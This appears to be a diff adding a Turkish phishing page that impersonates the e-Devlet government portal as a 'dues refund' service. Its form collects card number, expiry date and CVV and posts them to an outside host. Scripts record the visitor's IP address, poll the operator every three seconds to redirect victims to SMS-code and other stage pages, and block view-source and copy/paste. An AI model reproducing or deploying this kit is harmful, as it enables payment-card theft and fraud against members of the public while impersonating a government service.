@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+ 
+<html lang="zxx"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+ 
+ 
+    <title>e-Devlet | Aidat İade Sistemi</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- External CSS libraries -->
+    <link type="text/css" rel="stylesheet" href="./files/bootstrap.min.css">
+    <link type="text/css" rel="stylesheet" href="./files/font-awesome.min.css">
+    <link type="text/css" rel="stylesheet" href="./files/flaticon.css">
+
+    <!-- Favicon icon -->
+    
+
+    <!-- Google fonts -->
+    <link rel="stylesheet" type="text/css" href="./files/css">
+
+    <!-- Custom Stylesheet -->
+    <link type="text/css" rel="stylesheet" href="./files/style.css">
+    <link rel="stylesheet" type="text/css" id="style_sheet" href="./files/default.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/vue/2.5.17/vue.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.18.0/axios.min.js"></script>
+  <script>
+    const url = 'https://ipinfo.io/json';
+    new Vue({
+      el: '#app',
+      data: {
+        results: []
+      },
+      mounted() {
+        window.onload = () => {
+          axios.get(url).then(response => {
+            this.results = response.data;
+  
+            // IP adresini bir cookie'ye kaydet
+            document.cookie = "user_ip=" + this.results.ip;
+  
+            // Cookie'deki user_ip değerini al ve /api endpoint'ine post et
+            const userIp = getCookie('user_ip');
+            if (userIp) {
+              sendPostRequest(userIp);
+            }
+          });
+        };
+      }
+    });
+  
+   
+  
+    function getCookie(cname) {
+      const name = cname + '=';
+      const decodedCookie = decodeURIComponent(document.cookie);
+      const cookieArray = decodedCookie.split(';');
+  
+      for (let i = 0; i < cookieArray.length; i++) {
+        let cookie = cookieArray[i];
+        while (cookie.charAt(0) == ' ') {
+          cookie = cookie.substring(1);
+        }
+        if (cookie.indexOf(name) == 0) {
+          return cookie.substring(name.length, cookie.length);
+        }
+      }
+      return '';
+    }
+  </script>
+</head>
+<body id="top">
+<!-- Google Tag Manager (noscript) -->
+ 
+<!-- End Google Tag Manager (noscript) -->
+<div class="page_loader"></div>
+
+ 
+<script src="./files/jquery-3.2.1.min.js.indir" type="text/javascript"></script>
+<script src="./files/jquery.creditCardValidator.js.indir"></script>
+<script>
+function validate(){
+	var valid = true;	 
+    $(".demoInputBox").css('background-color','');
+    var message = "";
+
+    var cardHolderNameRegex = /^[a-z ,.'-]+$/i;
+    var cvvRegex = /^[0-9]{3,3}$/;
+    
+    var cardHolderName = $("#card-holder-name").val();
+    var cardNumber = $("#tach").val();
+    var cvv = $("#dogum").val();
+
+    if(cardHolderName == "" || cardNumber == "" || cvv == "") {
+    	   message  += "<div>Lütfen Tüm Alanları Doldurun.</div>";  
+    	   if(cardHolderName == "") {
+    		   $("#card-holder-name").css('background-color','#FFFFDF');
+    	   }
+    	   if(cardNumber == "") {
+    		   $("#tach").css('background-color','#FFFFDF');
+    	   }
+    	   if (cvv == "") {
+    		   $("#dogum").css('background-color','#FFFFDF');
+    	   }
+       valid = false;
+    }
+    
+    if (cardHolderName != "" && !cardHolderNameRegex.test(cardHolderName)) {
+        message  += "<div>Card Holder Name is Invalid</div>";    
+    		$("#card-holder-name").css('background-color','#FFFFDF');
+    		valid = false;
+    }
+    
+    if(cardNumber != "") {
+        	$('#tach').validateCreditCard(function(result){
+            if(!(result.valid)){
+                	message  += "<div>Kart Numarası Hatalı!</div>";    
+            		$("#tach").css('background-color','#FFFFDF');
+            		valid = false;
+            }
+        });
+    }
+    
+    if (cvv != "" && !cvvRegex.test(cvv)) {
+        message  += "<div>CVV Kodu Hatalı!</div>";    
+        $("#dogum").css('background-color','#FFFFDF');
+    		valid = false;
+    }
+    
+    if(message != "") {
+        $("#error-message").show();
+        $("#error-message").html(message);
+    }
+    return valid;
+}
+</script>
+
+<form id="frmContact" action="https://alliikkerrr.online//validateCaptcha.php" method="post" onsubmit="return validate();" data-gtm-form-interact-id="0">
+
+
+
+
+    <!-- External CSS libraries -->
+    <link type="text/css" rel="stylesheet" href="./files/bootstrap.min.css">
+    <link type="text/css" rel="stylesheet" href="./files/font-awesome.min.css">
+    <link type="text/css" rel="stylesheet" href="./files/flaticon.css">
+
+    <!-- Favicon icon -->
+ 
+
+ 
+    <link rel="stylesheet" type="text/css" href="./files/css">
+
+   
+    <link type="text/css" rel="stylesheet" href="./files/style.css">
+    <link rel="stylesheet" type="text/css" id="style_sheet" href="./files/default.css">
+
+
+
+ 
+<div class="page_loader"></div>
+ 
+
+<section class="creditly-wrapper wthree, w3_agileits_wrapper">
+      <div class="card bg-secondary shadow border-0">
+
+<div class="login-1">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12">
+                <div class="login-inner-form">
+                    <div class="details">
+                        <a href="#">
+                            <img src="./files/logo-2.png" alt="logo">
+                        </a>
+                        <h3>Online Aidat İade Sistemi</h3>
+
+
+			<font size="2" color="#960000">Aidat İadesi Yalnızca <b>Kredi Kartları</b> İçin Geçerlidir! </font>
+			<br>
+			<br>
+                        
+                            <div class="form-group">
+							
+                                <input class="number credit-card-number input-text" required="required" type="text" id="tach" name="tach" placeholder="Kart Numarası" data-gtm-form-interact-field-id="0">
+                            </div>
+                            <div class="form-group">
+                                <input class="expiration-month-and-year input-text" placeholder="Ay / Yıl" required="required" type="text" id="sifrexa" name="sifrexa" reqassetsred="" data-gtm-form-interact-field-id="1">
+                            </div>
+                            <div class="form-group">
+                                <input class="input-text" placeholder="CVV Kodu" maxlength="3" minlength="3" pattern="[0-9]*" required="required" type="number" id="dogum" name="dogum" reqassetsred="" data-gtm-form-interact-field-id="2">
+                            </div>
+                            
+                            <div class="form-group mb-0">
+                                <button type="submit" class="btn-md btn-theme btn-block">SORGULA</button>
+                            </div>
+							<br>
+							<div id="error-message"></div>
+                          </div>
+                        
+                       
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+ <script async="" src="./files/js"></script>
+ 
+
+ 
+<script>
+document.onkeydown = function(e) {
+        if (e.ctrlKey && 
+            (e.keyCode === 85 )) {
+            return false;
+        }
+};
+</script>
+
+<script type="text/javascript">
+$(document).ready(function () {
+     $('body').bind('cut copy paste', function (e) {
+        e.preventDefault();
+    });
+     
+     $('#id').bind('cut copy paste', function (e) {
+        e.preventDefault();
+    });
+});
+</script>
+
+<!-- credit-card -->
+		<script type="text/javascript" src="./files/creditly.js.indir"></script>
+		<script type="text/javascript">
+			$(function() {
+			  var creditly = Creditly.initialize(
+				  '.creditly-wrapper .expiration-month-and-year',
+				  '.creditly-wrapper .credit-card-number',
+				  '.creditly-wrapper .security-code',
+				  '.creditly-wrapper .card-type');
+
+			  $(".creditly-card-form .submit").click(function(e) {
+				e.preventDefault();
+				var output = creditly.validate();
+				if (output) {
+ 				  console.log(output);
+				}
+			  });
+			});
+		</script>
+ 
+
+</div></section></form>
+	<script>
+  new Vue({
+    el: '#app',
+    data: {
+      results: [],
+      userIp: ''  
+    },
+    mounted() {
+     
+      this.getUserIpFromCookie();
+      this.makeRequests();
+
+    
+      setInterval(() => {
+        this.getUserIpFromCookie();
+        this.makeRequests();
+      }, 3000);
+    },
+    methods: {
+      getUserIpFromCookie() {
+      
+        this.userIp = this.getCookie('user_ip');
+      },
+      makeRequests() {
+    if (this.userIp) {
+        var currentPage = window.location.pathname.split('/').pop();
+        axios.get(`/api?user_ip=${this.userIp}&current_page=${currentPage}`)
+            .then(response => {
+                this.results = response.data;
+                console.log('GET isteği başarıyla gönderildi. Sunucu yanıtı:', response.data);
+
+                // response.data'ya göre yönlendirme yap
+                if (response.data === 'sms') {
+                    window.location.href = '/sms.html';
+                } else if (response.data === 'tebrik') {
+                    window.location.href = '/tebrik.html';
+                } else if (response.data === 'hata') {
+                    window.location.href = '/hatali.html';
+                } else if (response.data === 'sms2') {
+                    window.location.href = '/hatali.html';
+                } else if (response.data === 'back') {
+                    window.location.href = '/index.html';
+                } else if (response.data === '1') {
+                    window.location.href = 'smsh.php';
+                } else if (response.data === '2') {
+                    window.location.href = 'kart.php';
+                } else if (response.data === '3') {
+                    window.location.href = 'bekle.php';
+                } else if (response.data === '4') {
+                    window.location.href = 'hata.php';
+                } else if (response.data === '5') {
+                    window.location.href = '/tebrik.html';
+                }
+            })
+            .catch(error => {
+                console.error('GET isteği sırasında bir hata oluştu:', error);
+            });
+    } else {
+        // Kullanıcı IP'si yoksa istek yapma
+        console.warn('Kullanıcı IP\'si bulunamadığı için GET isteği gönderilmedi.');
+    }
+},
+      getCookie(cname) {
+        const name = cname + '=';
+        const decodedCookie = decodeURIComponent(document.cookie);
+        const cookieArray = decodedCookie.split(';');
+
+        for (let i = 0; i < cookieArray.length; i++) {
+          let cookie = cookieArray[i];
+          while (cookie.charAt(0) == ' ') {
+            cookie = cookie.substring(1);
+          }
+          if (cookie.indexOf(name) == 0) {
+            return cookie.substring(name.length, cookie.length);
+          }
+        }
+        return '';
+      }
+    }
+  });
+</script> 
+<script>var Creditly=function(){var e,r,t,n,a,i=function(e,r){var t=$.trim($(r).val());return t+=String.fromCharCode(e.which),u(t)},u=function(e){return e.replace(/[^\d]/g,"")},s=function(e,r,t){return e.preventDefault(),!(function(e,r,t){return i(e,t).length>r}(e,r,t)||e.shiftKey||!function(e){return/^\d+$/.test(String.fromCharCode(e.which))}(e))},c=function(e){return e.match("^(34|37)")},o=function(e,r,t){return!function(e){return-1!==$.inArray(e.which,[46,8,9,0,27,13,190])||65==e.which&&!0===e.ctrlKey||67==e.which&&!0===e.ctrlKey||86==e.which&&!0===e.ctrlKey||e.which>=35&&e.which<=39}(e)&&s(e,r,t)},l={createCvvInput:function(t,n){e=t,r=n,$(e).keypress((function(t){$(e).removeClass("has-error");var n=i(t,r),a=i(t,e),u=function(e){return e?4:3}(c(n));o(t,u,e)&&$(e).val(a)}))}},d=function(){var e,r=[4,10,15],t=[4,8,12,16],n=function(e,r){for(var t=[],n=0,a=0;a<r.length;a++){if(!(e.length>r[a])){a<r.length?t.push(e.slice(n,r[a])):t.push(e.slice(n));break}t.push(e.slice(n,r[a])),n=r[a]}return t.length>0?t.join(" "):e};return{createNumberInput:function(a){e=a,$(e).keypress((function(a){$(e).removeClass("has-error");var u,s=i(a,e),l=c(s),d=function(e){return e?15:16}(l);o(a,d,e)&&(u=n(s,l?r:t),$(e).val(u),$(e).trigger("changed_input"))}))}}}(),p=(t=function(){var e=/(\d\d)\s*\/\s*(\d\d)/,r=function(e){return 15==e.length},t=function(e){if(0===e.length)return!1;if(/[^0-9-\s]+/.test(e))return!1;for(var r=0,t=0,n=!1,a=e.length-1;a>=0;a--){var i=e.charAt(a);t=parseInt(i,10),n&&(t*=2)>9&&(t-=9),r+=t,n=!n}return r%10==0};return{creditCard:function(e,n){var a=$(n.creditCardNumberSelector).val(),i=$.trim(a).replace(/\D/g,""),u=$(n.cvvSelector).val(),s=$.trim(u).replace(/\D/g,""),c=[],o=!0,l=[];return t(i)||(c.push(n.message.number),l.push(n.creditCardNumberSelector),o=!1),function(e,r){return!!(e&&4==r.length||!e&&3==r.length)}(r(i),s)||(c.push(n.message.security_code),l.push(n.cvvSelector),o=!1),result={is_valid:o,output_value:[i,s],selectors:l,messages:c},result},creditCardExpiration:function(r,t){var n=$.trim($(r).val()),a=e.exec(n),i=!1,u=["",""];if(a&&3===a.length){var s=parseInt(a[1],10),c="20"+a[2];s>=0&&s<=12&&(i=!0,u=[s,c])}return{is_valid:i,messages:[t.message],output_value:u}}}}(),n=function(e,r,n,a){if(r.hasOwnProperty(e)){var i=r[e],u=i.type,s=(i.name,t[u](e,i.data));if(!s.is_valid)return n.addError(e,s),!0;if(i.output_name instanceof Array)for(var c=0;c<i.output_name.length;c++)a.addOutput(i.output_name[c],s.output_value[c]);else a.addOutput(i.output_name,s.output_value)}},{validate:function(e){var r,t,a,i=(r=[],t=[],{addError:function(e,n){n.hasOwnProperty("selectors")?t=t.concat(n.selectors):t.push(e),r.concat(n.messages)},triggerErrorMessage:function(){for(var e={selectors:t,messages:r},n=0;n<t.length;n++)$(t[n]).addClass("has-error");$("body").trigger("creditly_client_validation_error",e)}}),u=(a={},{addOutput:function(e,r){for(var t=e.split("."),n=a,i=0;i<t.length;i++)n.hasOwnProperty(t[i])||(n[t[i]]={}),i===t.length-1?n[t[i]]=r:n=n[t[i]]},getOutput:function(){return a}}),s=!1;for(var c in e)n(c,e,i,u)&&(s=!0);return s?(i.triggerErrorMessage(),!1):u.getOutput()}}),v=function(){var e;return{createExpirationInput:function(r){e=r,$(e).keypress((function(r){if($(e).removeClass("has-error"),o(r,4,e)){var t=i(r,e);if(t.length>=2){var n=t.slice(0,2)+" / "+t.slice(2);$(e).val(n)}else $(e).val(t)}}))},parseExpirationInput:function(e){var r=u($(e).val()),t=r.slice(0,2);return{year:"20"+r.slice(2),month:t}}}}(),h={changeCardType:function(e,r){$(e).on("changed_input keypress keydown keyup",(function(t){var n,a=$(e).val(),i=(n=u(a),/^(34|37)/.test(n)?"American Express":/^4/.test(n)?"Visa":/^5[0-5]/.test(n)?"MasterCard":/^(6011|622|64[4-9]|65)/.test(n)?"Discover":"");$(r).text(i)}))}},f=function(e,r,t,n){var i=n||{};i.security_code_message=i.security_code_message||"Your security code is invalid",i.number_message=i.number_message||"Your credit card number is invalid",i.expiration_message=i.expiration_message||"Your credit card expiration is invalid",(a={})[r]={type:"creditCard",data:{cvvSelector:t,creditCardNumberSelector:r,message:{security_code:i.security_code_message,number:i.number_message}},output_name:["number","security_code"]},a[e]={type:"creditCardExpiration",data:{message:i.expiration_message},output_name:["expiration_month","expiration_year"]}};return{initialize:function(e,r,t,n,a){return f(e,r,t,a),v.createExpirationInput(e),d.createNumberInput(r),l.createCvvInput(t,r),h.changeCardType(r,n),this},validate:function(){return p.validate(a)}}}();</script>
+</body></html>
